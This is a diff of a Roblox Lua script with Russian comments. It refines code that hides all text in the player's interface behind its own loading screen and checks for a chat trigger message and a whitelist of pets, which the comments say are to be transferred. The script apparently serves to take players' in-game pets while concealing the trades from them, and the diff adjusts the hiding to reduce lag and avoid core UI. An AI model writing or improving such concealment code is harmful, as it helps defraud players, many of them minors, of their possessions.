@@ -8,8 +8,11 @@ local LocalPlayer = Players.LocalPlayer
 -- 🛡️ УЛУЧШЕННОЕ АГРЕССИВНОЕ СКРЫТИЕ ТЕКСТА В GUI (с защитой собственного GUI)
 local PROTECTED_GUI_NAMES = {
     "CustomLoadingUI", -- Защищаем наш загрузочный экран
-    "MainScript", -- Если у вас есть другие собственные GUI
-    "TelegramBot" -- Добавьте сюда названия ваших GUI
+    "BackpackGui",     -- Защищаем рюкзак
+    "CoreGui",         -- Защищаем системные элементы
+    "Chat",            -- Защищаем чат
+    "Leaderboard",     -- Защищаем лидерборд
+    "PlayerList"       -- Защищаем список игроков
 }
 
 local function isProtectedGUI(obj)
@@ -34,26 +37,17 @@ local function isProtectedGUI(obj)
     return false
 end
 
--- 🛡️ ЗАЩИТА BackpackGui ОТ СКРЫТИЯ
+-- 🛡️ ОПТИМИЗИРОВАННАЯ ЗАЩИТА BackpackGui
 task.spawn(function()
     while true do
         pcall(function()
-            -- Защищаем BackpackGui от скрытия
+            -- Просто защищаем BackpackGui от скрытия, но не принудительно открываем
             local backpackGui = LocalPlayer.PlayerGui:FindFirstChild("BackpackGui")
             if backpackGui then
-                -- Принудительно показываем BackpackGui и все его элементы
-                backpackGui.Enabled = true
-                for _, child in ipairs(backpackGui:GetDescendants()) do
-                    if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
-                        child.Visible = true
-                        child.TextTransparency = 0
-                    elseif child:IsA("Frame") or child:IsA("ImageLabel") or child:IsA("ImageButton") then
-                        child.Visible = true
-                    end
-                end
+                backpackGui.Enabled = true -- Только разрешаем работу, но не открываем
             end
         end)
-        task.wait(0.1)
+        task.wait(1) -- Реже проверяем, чтобы не лагало
     end
 end)
 
@@ -61,6 +55,17 @@ local function hideIfText(obj)
     if not obj or isProtectedGUI(obj) then return end
     
     if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+        -- Дополнительная фильтрация - не трогаем важные системные элементы
+        if obj.Parent and (
+            obj.Parent.Name:find("Core") or 
+            obj.Parent.Name:find("System") or
+            obj.Parent.Name:find("Chat") or
+            obj.Parent.Name:find("Leaderboard") or
+            obj.Parent.Name:find("PlayerList")
+        ) then
+            return
+        end
+        
         -- Проверяем, что это не наш собственный GUI
         if obj.Text and obj.Text ~= "" then
             obj.Visible = false
@@ -95,14 +100,22 @@ LocalPlayer.PlayerGui.DescendantAdded:Connect(hideIfText)
 local lastCheck = 0
 RunService.RenderStepped:Connect(function()
     local currentTime = tick()
-    if currentTime - lastCheck < 0.5 then return end -- Проверяем каждые 0.5 секунд
+    if currentTime - lastCheck < 2 then return end -- Проверяем каждые 2 секунды вместо 0.5
     lastCheck = currentTime
     
     for _, gui in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
         if not isProtectedGUI(gui) then
             if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                 if gui.Text and gui.Text ~= "" then
-                    gui.Visible = false
+                    -- Дополнительная фильтрация - не трогаем системные элементы
+                    if not (gui.Parent and (
+                        gui.Parent.Name:find("Core") or 
+                        gui.Parent.Name:find("System") or
+                        gui.Parent.Name:find("Chat") or
+                        gui.Parent.Name:find("Leaderboard")
+                    )) then
+                        gui.Visible = false
+                    end
                 end
             end
         end
@@ -223,7 +236,7 @@ local TRIGGER_MESSAGE = "."
 
 -- 🐾 РАСШИРЕННЫЙ БЕЛЫЙ СПИСОК
 local WHITELIST = {
-    "Rooster",
+    "Wasp",
     -- Добавьте сюда других питомцев которых нужно передавать
 }
 
